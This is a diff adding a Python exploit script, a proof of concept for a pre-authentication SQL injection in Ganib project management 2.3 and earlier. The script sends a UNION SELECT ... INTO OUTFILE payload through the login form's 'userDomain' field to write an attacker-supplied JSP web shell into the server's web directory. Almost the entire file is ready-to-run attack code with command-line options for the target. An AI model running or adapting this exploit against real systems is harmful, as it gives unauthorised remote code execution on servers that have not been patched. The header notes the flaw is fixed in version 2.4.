@@ -1,0 +1,71 @@
+# Exploit title: Ganib 2.x SQLi
+# Date: 02/02/2014
+# Exploit author: drone (@dronesec)
+# More information: http://forelsec.blogspot.com/2014/02/ganib-project-management-23-multiple.html
+# Vendor homepage: http://www.ganib.com/
+# Software link: http://downloads.sourceforge.net/project/ganib/Ganib-2.0/Ganib-2.0_with_jre.zip
+# Version: <= 2.3
+# Fixed in: 2.4
+# Tested on: Ubuntu 12.04 (apparmor disabled) / WinXP SP3
+
+from argparse import ArgumentParser
+import sys
+import string
+import random
+import requests
+
+""" Ganib 2.0 preauth SQLi PoC
+    @dronesec
+"""
+
+def loadJSP(options):
+    data = ''
+
+    try:
+        with open(options.jsp) as f:
+            for line in f.readlines():
+                data += line.replace("\"", "\\\"").replace('\n', '')
+    except Exception, e:
+        print e
+        sys.exit(1)
+
+    return data
+
+def run(options):
+    print '[!] Dropping %s on %s...' % (options.jsp, options.ip)
+
+    url = "http://{0}:8080/LoginProcessing.jsp".format(options.ip)
+    shell = ''.join(random.choice(string.ascii_lowercase+string.digits) for x in range(5))
+
+    exploit = '1 UNION SELECT "{0}","1","2","3" INTO OUTFILE "{1}"'
+    exploit = exploit.format(loadJSP(options), options.path + '/%s.jsp' % shell)
+
+    data = { "theAction" : "submit",
+             "J_USERNAME" : "test",
+             "J_PASSWORD" : "test",
+             "language" : "en",
+             "remember_checkbox" : "on",
+             "userDomain" : exploit
+           }
+
+    res = requests.post(url, data=data)
+    if res.status_code is 200:
+        print '[!] Dropped at /{0}.jsp'.format(shell)
+    else:
+        print '[!] Failed to drop JSP (HTTP {0})'.format(res.status_code)
+
+
+def parse():
+    parser = ArgumentParser()
+    parser.add_argument("-i", help='Server ip address', action='store', dest='ip',
+                        required=True)
+    parser.add_argument("-p", help='Writable web path (/var/www/ganib)', dest='path',
+                        action='store', default='/var/www/ganib')
+    parser.add_argument("-j", help="JSP to deploy", dest='jsp', action='store')
+
+    options = parser.parse_args()
+    options.path = options.path if options.path[-1] != '/' else options.path[:-1]
+    return options
+
+if __name__ == "__main__":
+    run(parse())
